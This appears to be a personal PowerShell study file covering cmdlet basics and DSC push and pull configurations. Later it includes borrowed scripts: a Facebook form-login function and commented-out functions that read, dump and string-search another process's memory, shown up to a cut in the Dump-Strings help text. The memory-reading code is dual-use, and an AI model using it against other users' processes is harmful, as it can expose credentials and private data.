#---------Yotam Nordman---------#
#region Really Basic Stuff
#region Get-Command
#  Get-Command <SomeCommand> -Syntax
# Will get the commands syntax this way:
#
# EXAMPLE:   Get-Service [[-Name] <string[]>] [-ComputerName <string[]>] [-DependentServices] [-RequiredServices] [-Include <string[]>] [-Exclude <string[]>] [<CommonParameters>]
#                 /\        /\       /\  /\              /\                                                                                                            /\
#                 !!        !!       !!  !!              !!                                                                                                            !!
#               Command  Positional Type Array        Optional                                                                                             Common stuff commands have
#
#               Square brackets mean optional.
#               Square brackets on a Command makes it a Positional Parameter - Meaning you can write the parameter without stating its name in the right position
#               EXAMPLE: Get-Service BITS -ComputerName localhost  -> BITS is a service name, i could write BITS without its parameter name because its the first positional parameter
#               Pointy brackets mean input type -> string int... could include [] to make it an array
#               No brackets means Mandatory (Name of the command is without brackets because it has to be written in order to invoke the command)
#               CommonParameters EXAMPLE: -Verbose            - Confirm           -WhatIf
#endregion
#region Help
# Most important command ever  -> Mark Something And Press F1 To View Help in ISE
# Remember to update help      -> Update-Help
# How to update help when not connected to the internet :
#
# Save-Help in a computer with up to date help on it
# Get the file to the target computer and   ->    Update-Help PathToTheHelpSaved
#
# Dont Forget the Switches :
#
#         -Full        ->      Gets all the help it can find
#         -Examples    ->      Gets examples of usage
#endregion
#region Get-Member -> gm
# Gets all members of a given Object , Command
# EXAMPLE:
# Get-Process | gm
#endregion
#region Select-Object Where-Object
# Select Object selects fields from a pipeline input
# EXAMPLE:
# Get-service | Select-Object DisplayName ,CanStop
# Where-Object lets to apply a condition to the pipeline input
# EXAMPLE:
# Get-Service | Where-Object Name -like 'bi*'
#endregion
#region Group-Object
# Can group objects by property
# EXAMPLE:
# Get-Service | Group-Object -Property Status
#endregion
#region  ->   $_.   <-
# Current object in the iteration or operation, like this. in .NET
#endregion
#region Check PowerShell Version
# $PSVersionTable.PSVersion
#endregion
#endregion Basic Stuff
#region Basic Usefull Stuff
#region Execution Policy , Set-StrictMode
# This is disabled by default and need to enable in order to run a full script from file !

#                        \/

# Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Force

#                        /\

# To avoid mistakes of performing impactfull commands on empty variables instead of one (Empty variables)
Set-StrictMode -Version 1
#endregion
#region Measure-Command , Measure-Object
# Measure Command gets a script block {} and measures the time it takes
# EXAMPLE:
# $Time = (Measure-Command {Get-Service BITS}).TotalMilliseconds
# Measure Object counts objects that get out of pipeline
# EXAMPLE:
# Get-Service | Measure-Object
#endregion
#region Get-Credential
# Lets you input credentials and save them or input to a function (prompts for creds)
# Some commands have -Credential to use the inputed credentials
# EXAMPLE:
# Invoke-Command -Credential (Get-Credential)
# $Creds = Get-Credential
#endregion
#region Get-Date
# Gets the current date and time                                                         !!
#                                                                                        \/
# Date - Date = TimeSpan   -> its not a date object type     ->     <TimeSpanObject>.TotalDays gives days combined with hours minutes and secounds etc...
#                                                                                        /\
#                                                                                        !!
#endregion
#region alias
# New-Alias  ->  New alternate name for something
# Notice when running exe files that u didnt cover their name with alias
# EXAMPLE: Run ipconfig.exe instead of writing ipconfig
#endregion
#region dir -> Get-ChildItem
# dir and ls are aliases for GetChildItem
# -Path <>  -> on a spacified path
# -Recurse  -> get all paths under that path in the tree
#endregion
#region Export-Csv , HashTable Col
# Can apear after a PIPELINE
# Theres an annoying line on top of the csv to remove it :
# -NoTypeInformation
# EXAMPLE:
# Get-Process | Select-Object ProcessName,@{Name='hello';Expression={$_.Threads.Count}} | Export-Csv -Path C:\PowerShell\hello.csv -NoTypeInformation
#endregion
#region -OutVariable , OutNull
# OutVariable directs a copy of the output to a variable of choice
# EXAMPLE:
# Get-Service -OutVariable something
# $something
# OutNull Redirects output to void
#endregion
#region New-IseSnippet , CTRL + J
# UseFull functions that can be pasted with CTRL + J
#endregion
#region Out-GridView -PassThru
# EXAMPLE:
# $s = dir C:\PowerShell| Out-GridView -PassThru   ->   Lets you pop out a windows and choose an object into the variable
#endregion
#region Shortcuts for ISE
# CTRL + J can paste some templates for stuff like advance functions
# CTRL + T opens a new powershell runspace within the same ise
# CTRL + N new page
# Alt and mark stuff does same as in notepad++
#endregion
#region Module imports
# Get a module from the Save-Module cmdlet with internet then u can copy
# Then can install from a the path u spacified in the last command
# Remember it has a param of Scope that installs it for one user or all users
#endregion
#endregion UserFull Stuff
#region More Advance Stuff
#region $ConfimPreference
# $ConfirmPreference = 'Low'   ->   Makes it so low and above impact commands only will get a prompt for user confirmation
# Default is 'Medium'
#endregion
#region New-EventLog
# New-EventLog -LogName 'opa' -Source 'SourceName'  ->  creates an event in the event log(event viewer)  ->  Winkey + R -> eventvwr
#endregion
#region Advanced Functions
# CTRL + J to paste the template
# $DynamicParam - runs only when u TYPE the command for dynamic params in the auto completion.  ->  MUST HAVE $Begin, $Process or $End !!!!!!!!!!!!!
# $End  ->  Runs at the end of the function
# $Begin  -> Runs at the very start of the function
# $Process -> Actuall logic of the function runs after the begin
#endregion
#region $?
# Gets True or False Whether the last command ran was successful
#endregion
#region Debug with Trace-Command
# EXAMPLE:
# Trace-Command -Name metadata,parameterbinding,cmdlet -Expression {Get-Service BITS} -PSHost
#endregion
#region &{}
# $s = & {<Code>}  ->  Runs the code but output is redirectred to the variable instead of screen
#endregion
#region Connection Testing
# Test-Connection      ->  Uses Ping
# Test-NetConnection   ->  Is like Telnet to check a port
#endregion
#region [validateset(values that you can accept)][]
# Declare the type of an object like string
# Example: [ValidateSet("opa")][string]$somestring can only accept strings that are equal to op
#endregion
#endregion
#region LDAP Query
# Basic LDAP Syntax
# (attribute=Something) -> (givenName=Name)
# Logical chars and wildcards still are relevant -> = & ! * |
# Where can i search with this LDAP -> In LDAP Datastores like AD
# Doesn't really apply to powershell
#endregion
#region DSC Stuff
#region Intro
# There are 3 types of pull servers in DSC
# SMB
# HTTP
# HTTPS
# With push the protocol used is wsman
# When u encrypt the data with the kerberos ticket u can use WINRM
# To get the registration key and certificate thumbprint to a remote machine you can push these details over push configuration in order to move to pull later
# Remember when publishing a configuration when i create a checksum to use -force otherwise it wont work and the remote nodes will still think the file is the old one
# Import-DscResource -ModuleName PSDesiredStateConfiguration
# This command works only inside a configuration, to get intellisense write an empty configuration block.
# Restore-DscConfiguration -> ROLLBACK (LCM Saved the previous configuration so if a rollback is necessary it will be already on the target nodes for rollback)
# Test-DscConfiguration -Detailed -> checks whether the actual configuration on the nodes matches the desired state configuration
# Means it runs all the test functions that are found inside the configuration
#endregion
#region LCM
# Get LCM -> Local Configuration Manager from a remote machine:
# Remember to enable the psremoting on the remote machine -> Enable-PSRemoting -SkipNetworkProfileCheck
# Then query the machine for its configuration:
# Get-DscLocalConfigurationManager -CimSession 'localhost'
# LCM is in every pc and its default configuration is PUSH There are 4 states to an LCM:
# Idle
# Busy
# PendingReboot
# PendingConfiguration
# To Test the LCM on a machine:
# Get-DscConfigurationStatus -> Check the LCM Status
# Get-DscConfigurationStatus -All -> Check the LCM Status History
# LCM Also has a flag of Action After Reboot (DO NOT MARK THE FLAG AS NO IT WILL FK UP OTHERS CONFIGS) and a debug mode that can pull the configuration from the machine and use remote debugging tools with f11 and all.
# Running the Configuration(by name) Creates the mof file (its the configuration file with everything that needs to be done in the configuration)
# Start-DscConfiguration Pushed the mof file created earlier
#endregion
#region DSC First Tests
Configuration MyFirstDSC
{
   # A Configuration block can have zero or more Node blocks
   Node 'DESKTOP-COBF18G'#'DESKTOP-B0R554C'
   {
        Archive myArchiveExample
        {
            Ensure = "Present" # You can also set Ensure to "Absent"
            Path = "C:\PSTest\Demos.zip"
            Destination = "C:\PSTest\Test"
            DependsOn= '[File]CreateFolder'
        }
        Registry myRegistryExample
        {
          Ensure = "Present"
          Key = 'HKEY_LOCAL_MACHINE\SOFTWARE'
          ValueName = "HELLO"
          ValueData = "ITS.ME"
        }
        File CreateFolder
        {
            DestinationPath='C:\PSTest\Test'
            Ensure ='Present'
            Type ='Directory'
        }
#        WindowsFeature IIS
#        {
#        Ensure = "Present"
#        Name = "Web-Server"
#        }
#        File WebDirectory
#        {
#        Ensure = "Present"
#        Type = "Directory"
#        Recurse= $true
#        SourcePath= 'C:\Powershell\whatwhat'
#        DestinationPath= "C:\inetpub\wwwroot"
#        DependsOn= "[WindowsFeature]IIS"
#       }
    }

   LocalConfigurationManager{
   ConfigurationMode="ApplyAndAutocorrect"
   RefreshFrequencyMins=30
   ConfigurationModeFrequencyMins=30
   #ConfigurationID=''
   #DownloadManagerName="WebDownloadManager"
   #RefreshMode="Pull"
   #CertificateID="71AA68562316FE3F73536F1096B85D66289ED60E"
   #Credential=$cred
   #RebootNodeIfNeeded=$true
   #AllowModuleOverwrite=$false
   }
}
mkdir 'C:\PSTest\MyFirstDSC\' -ErrorAction SilentlyContinue
cd 'C:\PSTest\MyFirstDSC\'
# Remember you tard! this creates the mof file of the configuration, and it creates it in a directory in the name of the configuration so double \MyFirstDSC
MyFirstDSC

#notepad .\MyFirstDSC\Web2012R2.mof

Start-DscConfiguration  -Verbose -Path 'C:\PSTest\MyFirstDSC\MyFirstDSC\' -Force -Wait -ComputerName 'DESKTOP-COBF18G'
Get-DscConfigurationStatus
Get-DscConfiguration
#Stop-DscConfiguration 
#Enable-PSRemoting
#Enable-PSRemoting -SkipNetworkProfileCheck
#endregion
#region PUSH Configuration
# The default configuration of a node is push mode
# EXAMPLE for pushing RSAT into a target node
configuration GiveRSAT
{
node localhost
    {
        WindowsFeature FileServices
        {
            Ensure = "Present"
            Name = "RSAT-File-Services"
        }
    }
}
# DscLocalConfigurationManager() is a type for configuring the lcm of a node with some flags that determine how the lcm acts
[DscLocalConfigurationManager()]
Configuration LCMPushDisableReboot 
{ 
    Node localhost     
        {        
            Settings        
                {            
                    ActionAfterReboot              = 'ContinueConfiguration'
                    ConfigurationMode              = 'ApplyAndAutoCorrect'
                    RebootNodeIfNeeded             = $False
                    RefreshMode                    = 'Push'
                 }          
        } 
}
# Get-Job -> Gets Windows PowerShell background jobs that are running in the current session
# Dependencies with DependsOn
# Remember that a configuration runs asyncronicly(all kinds of jobs run in paralel) which means if a job depends on another job it can be messed up because the other job runs after it by chance
# so to stage the deployment of a configuration use dependencies Example in DSC First Tests in the file
#endregion
#region PULL Configuration
# The DSC-Service is a built in feature on widows server 2012 r2 and later operating systems.
# This service is built on top of the Web-Server role.
# Installing the windows feature does not enable the service. it must be configred and the best way to configure is DSC
# There is an external DSC resource module named xPSDesiredStateConfiguration that contains the xDSCWebService resource. It contains all of the appropriate settings to configure the pull server.
#region Configuration for a pull server example:
# Install-Module -Name xPSDesiredStateConfiguration -Force
#configuration Sample_xDscWebServiceRegistration
#{
#    param 
#    (
#        [string[]]$NodeName = 'localhost',
#
#        [ValidateNotNullOrEmpty()]
#        [string] $certificateThumbPrint,
#
#        [Parameter(HelpMessage='This should be a string with enough entropy (randomness) to protect the registration of clients to the pull server.  We will use new GUID by default.')]
#        [ValidateNotNullOrEmpty()]
#        [string] $RegistrationKey   # A guid that clients use to initiate conversation with pull server
#    )
#
#    Import-DSCResource -ModuleName xPSDesiredStateConfiguration
#
#    Node $NodeName
#    {
#        WindowsFeature DSCServiceFeature
#        {
#            Ensure = "Present"
#            Name   = "DSC-Service"            
#        }
#
#        xDscWebService PSDSCPullServer
#        {
#            UseSecurityBestPractices= $false
#            # Beware of this flag i have no idea what it does
#            Ensure                  = "Present"
#            EndpointName            = "PSDSCPullServer"
#            Port                    = 8080
#            PhysicalPath            = "$env:SystemDrive\inetpub\PSDSCPullServer"
#            CertificateThumbPrint   = $certificateThumbPrint
#            ModulePath              = "$env:PROGRAMFILES\WindowsPowerShell\DscService\Modules"
#            ConfigurationPath       = "$env:PROGRAMFILES\WindowsPowerShell\DscService\Configuration"            
#            State                   = "Started"
#            DependsOn               = "[WindowsFeature]DSCServiceFeature" 
#            RegistrationKeyPath     = "$env:PROGRAMFILES\WindowsPowerShell\DscService"   
#            AcceptSelfSignedCertificates = $true
#            Enable32BitAppOnWin64   = $false
#        }
#
#        File RegistrationKeyFile
#        {
#            Ensure          = 'Present'
#            Type            = 'File'
#            DestinationPath = "$env:ProgramFiles\WindowsPowerShell\DscService\RegistrationKeys.txt"
#            Contents        = $RegistrationKey
#        }
#    }
#}
#$thumbprint = (New-SelfSignedCertificate -Subject "TestPullServer").Thumbprint
# Remember if you do it for real to not use a selfsign cert
# The New-SelfSignedCertificate must have a subject and defaultly goes into the LocalMachine\MY (Personal Store)
#$registrationkey = [guid]::NewGuid()
#Sample_xDscWebServiceRegistration -RegistrationKey $registrationkey -certificateThumbPrint $thumbprint
#Start-DscConfiguration -ComputerName 'localhost' -Path 'C:\Users\administrator\Desktop\Sample_xDscWebServiceRegistration'
#endregion
#region Configuration for a pull cilent example:
#[DSCLocalConfigurationManager()]
#configuration Sample_RegisterWithLessSecurePullServer
#{
#    param
#    (
#        [ValidateNotNullOrEmpty()]
#        [string] $NodeName,
#
#        [ValidateNotNullOrEmpty()]
#        [string] $RegistrationKey, #same as the one used to setup pull server in previous configuration
#
#        [ValidateNotNullOrEmpty()]
#        [string] $ServerName = 'PULL' #node name of the pull server, same as $NodeName used in previous configuration
#    )
#
#    Node $NodeName
#    {
#        Settings
#        {
#            RefreshMode        = 'Pull'
#        }
#
#        ConfigurationRepositoryWeb DSC-PullSrv
#        {
#            ServerURL          = "https://$ServerName`:8080/PSDSCPullServer.svc" # notice it is https
#            RegistrationKey    = $RegistrationKey
#            ConfigurationNames = @('ClientConfig')
#        }   
#
#        ReportServerWeb DSC-PullSrv
#        {
#            ServerURL       = "https://$ServerName`:8080/PSDSCPullServer.svc" # notice it is https
#            RegistrationKey = $RegistrationKey
#        }
#    }
#}
#Sample_RegisterWithLessSecurePullServer -RegistrationKey "7e6d2855-b5bb-46c6-a023-254443b7cfbd" -NodeName M1
#Set-DscLocalConfigurationManager -Path 'C:\Users\administrator\Desktop\Sample_RegisterWithLessSecurePullServer\' -ComputerName 'M1'
# Sample use (please change values of parameters according to your scenario):
# Sample_MetaConfigurationToRegisterWithLessSecurePullServer -RegistrationKey $registrationkey
# This will register the client and configure the local lcm to the correct pull server with a configuration named ClientConfig
#endregion
#endregion
#endregion
#region Usefull scripts of other people
#region Facebook Login
function Login-Facebook {
# Remember to give creds as param
# $Credential = Get-Credential
# Login-Faceook $Credential
  param ($Credential)
  
  $url = 'https://www.facebook.com/'
  $r = Invoke-WebRequest -Uri $url -SessionVariable fb -UseBasicParsing   
  $form = $r.Forms[0]
  
  # change this to match the website form field names:
  $form.Fields['email'] = $Credential.UserName
  $form.Fields['pass'] = $Credential.GetNetworkCredential().Password
  
  # change this to match the form target URL
  $r = Invoke-WebRequest -Uri $form.Action -WebSession $fb -Method POST -Body $form.Fields
  $r
}
#endregion Facebook Login
#region Reading From Memory
# Not my code but it seems usefull so...
<#
function Check-MemoryProtection
{
##################################################################
#.Synopsis
# Retrieves the memory protections of an arbitrary address.
#.Description
# The Check-MemoryProtection cmdlet returns the memory protections of any memory address.
#
# Check-MemoryProtection is just a wrapper for the Windows API VirtualQuery function that outputs protections in a human-readable format.
#.Parameter Address
# Specifies the address whose memory protections are to be queried.
#.Parameter ProcessId
# Queries the memory of the provided process ID.
#.Parameter PageSize
# Specifies the memory page size. This can safely be left to its default of 0x1000 bytes.
#.Outputs
# Winapi.Kernel32+MEMORY_BASIC_INFORMATION
#     By default, Check-MemoryProtection returns a MEMORY_BASIC_INFORMATION structure.
#.Example
# C:\PS>$proc = [System.Diagnostics.Process]::GetCurrentProcess()
# 
# C:\PS>$module = $proc.MainModule
# 
# C:\PS>$base = $module.BaseAddress
# 
# C:\PS>Check-MemoryProtection $base
# 
# BaseAddress       : 5363597312
# AllocationBase    : 5363597312
# AllocationProtect : PAGE_EXECUTE_WRITECOPY
# RegionSize        : 4096
# State             : MEM_COMMIT
# Protect           : PAGE_READONLY
# Type              : MEM_IMAGE
# 
# 
# Description
# -----------
# This command returns the memory protections of the currently loaded process' base address. In this example, the memory address queried is the base address of powershell.exe
#.Example
# C:\PS>$proc = ps cmd
# 
# C:\PS>$base = $proc.MainModule.BaseAddress
# 
# C:\PS>Check-MemoryProtection $base $proc.Id
# 
# BaseAddress       : 1246035968
# AllocationBase    : 1246035968
# AllocationProtect : PAGE_EXECUTE_WRITECOPY
# RegionSize        : 4096
# State             : MEM_COMMIT
# Protect           : PAGE_READONLY
# Type              : MEM_IMAGE
# 
# 
# Description
# -----------
# This command returns the memory protections of cmd.exe.
#.Example
# C:\PS>Check-MemoryProtection 0x00000000
# 
# BaseAddress       : 0
# AllocationBase    : 0
# AllocationProtect : 0
# RegionSize        : 65536
# State             : MEM_FREE
# Protect           : PAGE_NOACCESS
# Type              : 0
# 
# 
# Description
# -----------
# This command returns the memory protections of the null page.
#.Link
# My blog: http://www.exploit-monday.com/
# MEMORY_BASIC_INFORMATION structure info: http://msdn.microsoft.com/en-us/library/windows/desktop/aa366775%28v=vs.85%29.aspx
##################################################################
    [CmdletBinding()] Param (
        [Parameter(Position = 0, Mandatory = $True)] [System.IntPtr] $Address,
        [Parameter(Position = 1)] [Int] $ProcessId,
        [Parameter(Position = 2)] [Int] $PageSize = 0x1000
    )
    
    try
    {
        $mem = New-Object Winapi.Kernel32+MEMORY_BASIC_INFORMATION
    }
    catch
    {
        $code = @"
        using System;
        using System.Runtime.InteropServices;

        namespace Winapi
        {
            public class Kernel32
            {
                [Flags]
                public enum ProcessAccessFlags : uint
                {
                    PROCESS_VM_READ = 0x00000010,
                    PROCESS_QUERY_INFORMATION = 0x00000400,
                    ALL = 0x001F0FFF
                }
            
                [Flags]
                public enum AllocationProtectEnum : uint
                {
                    PAGE_EXECUTE = 0x00000010,
                    PAGE_EXECUTE_READ = 0x00000020,
                    PAGE_EXECUTE_READWRITE = 0x00000040,
                    PAGE_EXECUTE_WRITECOPY = 0x00000080,
                    PAGE_NOACCESS = 0x00000001,
                    PAGE_READONLY = 0x00000002,
                    PAGE_READWRITE = 0x00000004,
                    PAGE_WRITECOPY = 0x00000008,
                    PAGE_GUARD = 0x00000100,
                    PAGE_NOCACHE = 0x00000200,
                    PAGE_WRITECOMBINE = 0x00000400,
                }
                
                [Flags]
                public enum StateEnum : uint
                {
                    MEM_COMMIT = 0x00001000,
                    MEM_FREE = 0x00010000,
                    MEM_RESERVE = 0x00002000,
                }
                
                [Flags]
                public enum TypeEnum : uint
                {
                    MEM_IMAGE = 0x01000000,
                    MEM_MAPPED = 0x00040000,
                    MEM_PRIVATE = 0x00020000,
                }
            
                [StructLayout(LayoutKind.Sequential)]
                public struct MEMORY_BASIC_INFORMATION
                {
                    public UIntPtr BaseAddress;
                    public UIntPtr AllocationBase;
                    public AllocationProtectEnum AllocationProtect;
                    public IntPtr RegionSize;
                    public StateEnum State;
                    public AllocationProtectEnum Protect;
                    public TypeEnum Type;
                }

                [DllImport("kernel32.dll")]
                public static extern IntPtr OpenProcess(ProcessAccessFlags dwDesiredAccess, [MarshalAs(UnmanagedType.Bool)] bool bInheritHandle, uint dwProcessId);
                [DllImport("kernel32.dll")]
                public static extern int VirtualQuery(IntPtr lpAddress, ref MEMORY_BASIC_INFORMATION lpBuffer, int dwLength);
                [DllImport("kernel32.dll")]
                public static extern int VirtualQueryEx(IntPtr hProcess, IntPtr lpAddress, ref MEMORY_BASIC_INFORMATION lpBuffer, int dwLength);
                [DllImport("kernel32.dll")]
                public static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out, MarshalAs(UnmanagedType.AsAny)] object lpBuffer, int dwSize, [Out] int lpNumberOfBytesRead);
                [DllImport("kernel32.dll")]
                public static extern bool CloseHandle(IntPtr hObject);
            }
        }
"@

        $codeProvider = New-Object Microsoft.CSharp.CSharpCodeProvider
        $location = [PsObject].Assembly.Location
        $compileParams = New-Object System.CodeDom.Compiler.CompilerParameters
        $assemblyRange = @("System.dll", $location)
        $compileParams.ReferencedAssemblies.AddRange($assemblyRange)
        $compileParams.GenerateInMemory = $True
        $codeProvider.CompileAssemblyFromSource($compileParams, $code) | Out-Null
    }

    $mem = New-Object Winapi.Kernel32+MEMORY_BASIC_INFORMATION

    if ($ProcessId)
    {
        $ProcHandle = [Winapi.Kernel32]::OpenProcess([Winapi.Kernel32+ProcessAccessFlags]::PROCESS_QUERY_INFORMATION, 0, $ProcessId)
        [Winapi.Kernel32]::VirtualQueryEx($ProcHandle, $Address, [ref] $mem, $PageSize) | Out-Null
        [Winapi.Kernel32]::CloseHandle($ProcHandle) | Out-Null
    }
    else
    {
        [Winapi.Kernel32]::VirtualQuery($Address, [ref] $mem, $PageSize) | Out-Null
    }
    
    return $mem
}

function Dump-Memory
{
##################################################################
#.Synopsis
# Dumps memory contents to stdout or to disk.
#.Description
# The Dump-Memory cmdlet displays the contents of memory to stdout. You also have the option to dump raw memory to disk.
#.Parameter Address
# Specifies the base address of memory that is to be dumped.
#.Parameter Offset
# Specifies the number of bytes to dump.
#.Parameter ProcessId
# Dumps the memory of the process whose ID was specified.
#.Parameter Width
# Specifies how many bytes to print per line when outputting to stdout
#.Parameter DumpToFile
# Specifies the path to the output file.
# 
# When this option is specified, memory will not be displayed on stdout.
# 
# This parameter can be in the for of an absolute or relative file path.
#.Example
# $proc = ps cmd
# 
# $module = $proc.MainModule
# 
# $base = $module.BaseAddress
# 
# Dump-Memory $base 0x98 -ProcessId $proc.Id
# 
# 00000000h  4D 5A 90 00 03 00 00 00 04 00 00 00 FF FF 00 00  MZ..........ÿÿ..
# 00000010h  B8 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00  ,.......@.......
# 00000020h  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
# 00000030h  00 00 00 00 00 00 00 00 00 00 00 00 F0 00 00 00  ............d...
# 00000040h  0E 1F BA 0E 00 B4 09 CD 21 B8 01 4C CD 21 54 68  ..º..'.I!,.LI!Th
# 00000050h  69 73 20 70 72 6F 67 72 61 6D 20 63 61 6E 6E 6F  is.program.canno
# 00000060h  74 20 62 65 20 72 75 6E 20 69 6E 20 44 4F 53 20  t.be.run.in.DOS.
# 00000070h  6D 6F 64 65 2E 0D 0D 0A 24 00 00 00 00 00 00 00  mode....$.......
# 00000080h  4D 7C A4 8A 09 1D CA D9 09 1D CA D9 09 1D CA D9  M|☼...EU..EU..EU
# 00000090h  00 65 4E D9 08 1D CA D9                          .eNU..EU
# 
# 
# Description
# -----------
# This command dumps the first 0x98 bytes of the main module of cmd.exe to stdout.
#.Example
# C:\PS>$proc = [System.Diagnostics.Process]::GetCurrentProcess()
# 
# C:\PS>$module = $proc.MainModule
# 
# C:\PS>$base = $module.BaseAddress
# 
# C:\PS>Dump-Memory $base 0x120
# 
# 00000000h  4D 5A 90 00 03 00 00 00 04 00 00 00 FF FF 00 00  MZ..........ÿÿ..
# 00000010h  B8 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00  ,.......@.......
# 00000020h  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
# 00000030h  00 00 00 00 00 00 00 00 00 00 00 00 00 01 00 00  ................
# 00000040h  0E 1F BA 0E 00 B4 09 CD 21 B8 01 4C CD 21 54 68  ..º..'.I!,.LI!Th
# 00000050h  69 73 20 70 72 6F 67 72 61 6D 20 63 61 6E 6E 6F  is.program.canno
# 00000060h  74 20 62 65 20 72 75 6E 20 69 6E 20 44 4F 53 20  t.be.run.in.DOS.
# 00000070h  6D 6F 64 65 2E 0D 0D 0A 24 00 00 00 00 00 00 00  mode....$.......
# 00000080h  FF 54 CD 72 BB 35 A3 21 BB 35 A3 21 BB 35 A3 21  ÿTIr»5£!»5£!»5£!
# 00000090h  9C F3 D8 21 B9 35 A3 21 B2 4D 36 21 BA 35 A3 21  .óO!.5£!.M6!º5£!
# 000000A0h  B2 4D 27 21 AB 35 A3 21 B2 4D 30 21 AA 35 A3 21  .M'!«5£!.M0!ª5£!
# 000000B0h  BB 35 A2 21 20 35 A3 21 B2 4D 20 21 FF 35 A3 21  »5¢!.5£!.M.!ÿ5£!
# 000000C0h  B2 4D 29 21 BD 35 A3 21 9C F3 DD 21 BA 35 A3 21  .M)!.5£!.óY!º5£!
# 000000D0h  B2 4D 37 21 BA 35 A3 21 B2 4D 32 21 BA 35 A3 21  .M7!º5£!.M2!º5£!
# 000000E0h  52 69 63 68 BB 35 A3 21 00 00 00 00 00 00 00 00  Rich»5£!........
# 000000F0h  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
# 00000100h  50 45 00 00 64 86 05 00 F3 C7 5B 4A 00 00 00 00  PE..d...óÇ[J....
# 00000110h  00 00 00 00 F0 00 22 00 0B 02 09 00 00 DC 00 00  ....d."......Ü..
# 
# 
# Description
# -----------
# This command dumps the first 0x120 bytes of the main module of the currently loaded process (powershell.exe) to stdout.
#.Example
# C:\PS>$proc = [System.Diagnostics.Process]::GetCurrentProcess()
# 
# C:\PS>$module = $proc.MainModule
# 
# C:\PS>$size = $module.ModuleMemorySize
# 
# C:\PS>$base = $module.BaseAddress
# 
# C:\PS>Dump-Memory $base $size -DumpToFile .\out.exe
# 
# 
# Description
# -----------
# This command dumps the entire memory image of powershell.exe to disk in binary format.
# 
# Note: Execution of the dumped memory image requires fixing up the PE header.
#.Link
# My blog: http://www.exploit-monday.com/
##################################################################
    [CmdletBinding()] Param (
        [Parameter(Position = 0, Mandatory = $True)] [System.IntPtr] $Address,
        [Parameter(Position = 1, Mandatory = $True)] [Int] $Offset,
        [Parameter()] [Int] $ProcessId,
        [Parameter()] [Int] $Width = 16,
        [Parameter()] [String] $DumpToFile
    )
    
    $BaseAddress = $Address.ToInt64()
        
    for ($PageOffset = 0; $PageOffset -lt $Offset; $PageOffset += 0x1000)
    {
        $PageBaseAddress = [IntPtr]($BaseAddress + $PageOffset)
            
        if ($ProcessId)
        {
            $MemProtect = Check-MemoryProtection $PageBaseAddress $ProcessId
        }
        else
        {
            $MemProtect = Check-MemoryProtection $PageBaseAddress
        }
            
        if ($MemProtect.Protect -eq [Winapi.Kernel32+AllocationProtectEnum]::PAGE_NOACCESS)
        {
            throw "Memory region at base address 0x$($PageBaseAddress.ToString('X16')) is inaccessible!`n `nMemory Protection Information:`n$($MemProtect | Out-String)`n `n"
        }
    }
    
    [Byte[]] $ByteArray = New-Object Byte[]($Offset)
    
    if ($ProcessId)
    {
        $BytesRead = 0
        $ProcHandle = [Winapi.Kernel32]::OpenProcess(([Winapi.Kernel32+ProcessAccessFlags]::PROCESS_VM_READ), 0, $ProcessId)
        [Winapi.Kernel32]::ReadProcessMemory($ProcHandle, $Address, $ByteArray, $Offset, $BytesRead) | Out-Null
        [Winapi.Kernel32]::CloseHandle($ProcHandle) | Out-Null
    }
    else
    {
        [System.Runtime.InteropServices.Marshal]::Copy($Address, $ByteArray, 0, $Offset)
    }
    
    $Position = 0
    $Padding = ($Width * 2) + $Width
    
    if($DumpToFile)
    {
  
        if ($FilePath = Split-Path $DumpToFile)
        {
            if (Test-Path $FilePath)
            {
                $File = "$(Resolve-Path $FilePath)\$DumpToFile"
            }
            else
            {
                throw "Invalid file path!"
            }
        }
        else
        {
            $File = "$(Resolve-Path .)\$DumpToFile"
        }
        
        $Stream = New-Object System.IO.FileStream($File, [System.IO.FileMode]::Create)
        $Stream.Write($ByteArray, 0, $Offset)
        $Stream.Close()
    }
    else
    {
        while ($Position -le ($Offset-1))
        {
            $Line = ""

            $Line = "$($Position.ToString('X8'))h  "
            $PrintBytes = ""
            $Text = ""

            foreach ($i in 0..($Width-1))
            {
                if ($Position -ge $Offset) {break}
            	
                $PrintBytes += "$($ByteArray[$Position].ToString('X2')) "

                if ( [Char]::IsLetterOrDigit($ByteArray[$Position]) -or [Char]::IsPunctuation($ByteArray[$Position]) -or [Char]::IsSymbol($ByteArray[$Position]) )
                {
                    $Text += [Char] $ByteArray[$Position]
                }
                else
                {
                    $Text += '.'
                }
                
                $Position++
            }

            $Line += $PrintBytes.PadRight($Padding, ' ')
                        
            $Line += " $Text"

            $Line
        }
    }
    
}

function Dump-Strings
{
##################################################################
#.Synopsis
# Retrieves strings from memory.
# 
# Author: Matthew Graeber (@mattifestation)
# License: GNU GPL v2
#.Description
# The Dump-Strings cmdlet retrieves strings from the memory of any process.
#
# Dump-Strings will print both ASCII and Unicode strings to stdout. Its functionality is similar to Sysinternals strings.exe but it operates in memory.
#.Parameter Address
# Specifies the memory base address.
#.Parameter Offset
# Specifies the number of bytes to process.
#.Parameter ProcessId
# Dumps the strings of the process whose ID was specified. Not specifying a process ID will result in querying the address space of powershell.exe.
#.Parameter Encoding
# Specifies the string encoding to use. The default option is 'DEFAULT' which will return both ASCII and Unicode. The other options are 'ASCII' and 'UNICODE'
#.Parameter MinimumLength
# Specifies the minimum length string to return. The default length is 3.
#.Parameter StringOffset
# Specifies the offset in memory where the string occurs.
#.Example
# C:\PS>$proc = Get-Process cmd
# 
# C:\PS>$module = $proc.MainModule
# 
# C:\PS>$size = $module.ModuleMemorySize
# 
# C:\PS>$base = $module.BaseAddress
# 
# C:\PS>Dump-Strings $base $size -MinimumLength 20 -ProcessId $proc.Id
# 
# !This program cannot be run in DOS mode.
# api-ms-win-core-processthreads-l1-1-0.DLL
# SetConsoleInputExeNameW
# APerformUnaryOperation: '%c'
# APerformArithmeticOperation: '%c'
# NtQueryInformationProcess
# SaferComputeTokenFromLevel
# ImpersonateLoggedOnUser
# SaferRecordEventLogEntry
# CreateProcessAsUserW
# GetSecurityDescriptorOwner
# WNetCancelConnection2W
# __C_specific_handler
# RtlLookupFunctionEntry
# ...
# 
# 
# Description
# -----------
# This command prints all Ascii and Unicode strings of length > 19 in the memory space of the main module of cmd.exe.
#.Example
# C:\PS>$proc = [System.Diagnostics.Process]::GetCurrentProcess()
# 
